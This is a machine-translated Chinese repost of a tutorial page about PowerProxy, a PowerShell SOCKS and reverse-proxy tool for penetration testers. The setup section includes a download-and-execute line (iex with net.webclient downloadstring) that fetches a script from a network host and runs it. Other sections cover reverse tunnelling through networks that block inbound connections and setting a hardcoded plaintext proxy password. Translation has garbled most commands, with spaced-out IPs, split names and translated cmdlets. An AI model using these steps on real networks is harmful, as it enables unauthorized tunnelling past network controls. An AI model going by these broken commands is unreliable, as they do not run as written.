# PowerProxy:具有反向代理功能的 PowerShell SOCKS 代理

> 原文：<https://kalilinuxtutorials.com/powerproxy/>

[![](img/cee58e8d88272d1a54333daa56ff7dec.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPqRKWApKgOZgiCruNP8X3l36auUY7VDI-ozM0_o9AOGrq1f0pPm63ciscTO-bP2_gB0U8Egv2QaCGSbHlGzvWXl8IPbm6Wax9a6Ihcaq5dhy1lZL3ENyhpiFiXVQoY9GP35OgWra0wr5opoIFNBQvSEtVl1Y1zWK-nhOks6Hc-1CpAD8e3RKU_lQ6/s728/download%20(1).png)

PowerProxy 是一个具有反向代理功能的 PowerShell SOCKS 代理。

PowerProxy 是为渗透测试人员编写的。对于穿越阻止入站连接的网络，反向代理功能是优先考虑的。默认情况下，反向代理连接是加密的。Socks 5 连接支持用户名/密码验证。

## 设置

导入脚本:

iex (new-object net.webclient)。download string(" http://192 . 168 . 0 . 22/power proxy . PS1 ")
或
Import-Module \ 192 . 168 . 0 . 22 \ Public \ power proxy . PS1

**reverse_proxy_handler.py** 可以创建临时 SSL 证书，这需要 OpenSSL。如果您的机器上没有安装 OpenSSL(大多数基于 Linux/Unix 的系统上都有)，请提供您自己的证书或使用*–不加密*选项。

## 用法

详细用法，查看 PowerProxy 的帮助，或者使用*。/reverse _ proxy _ handler . py–help*

### **运行反向代理**

在本地机器上，启动处理程序:

**监听端口 8080 上的反向代理。客户端连接到端口 1080(默认)
。/reverse _ proxy _ handler . py-p 8080**

在 PowerShell 中:

**启动-反向锁止 172.1.1.20-端口 8080**

代理客户端可以将 reverse_proxy_handler.py 创建的服务器视为实际的 SOCKS 服务器:

**curl–socks 4 127 . 0 . 0 . 1:1080 http://10 . 10 . 2 . 69/**

**运行传统的 SOCKS 服务器**

**起始 socks 代理 172.10.2.20 端口 9050**

### 要求认证

使用 PSCredential 对象要求用户名和密码:

**创建凭证
$ Password = convert to-SecureString-asplaint ext-Force " passw0rd 123 "
$ Cred = New-Object System。management . automation . PS Credential(" proxy user "，$ Password)
Start-reversesocks proxy-Credential $ Cred-Address 10 . 10 . 10 . 24-Verbose**

[**Download**](https://github.com/get-get-get-get/PowerProxy)